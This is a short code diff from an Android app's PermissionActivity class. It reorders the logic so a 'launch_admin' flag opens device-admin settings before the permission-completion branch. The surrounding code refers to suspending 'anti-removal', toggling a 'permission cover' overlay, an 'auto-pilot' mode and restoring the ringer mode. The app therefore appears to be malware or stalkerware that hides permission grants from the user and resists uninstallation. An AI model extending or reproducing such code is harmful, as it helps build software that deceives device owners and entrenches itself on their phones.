@@ -97,17 +97,17 @@ public class PermissionActivity extends AppCompatActivity {
         // SUSPEND ANTI-REMOVAL
         getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", true).apply();
 
+        if (getIntent() != null && getIntent().getBooleanExtra("launch_admin", false)) {
+            openAdminSettings();
+            finish();
+            return;
+        }
+
         if (allStandardGranted()) {
             restoreRingerMode();
             IO_Persistence_Manager.setPermissionCoverVisible(false);
             IO_Persistence_Manager.setAutoPilot(false);
             showCompletionUI();
-            return;
-        }
-
-        if (getIntent() != null && getIntent().getBooleanExtra("launch_admin", false)) {
-            openAdminSettings();
-            finish();
             return;
         }
         
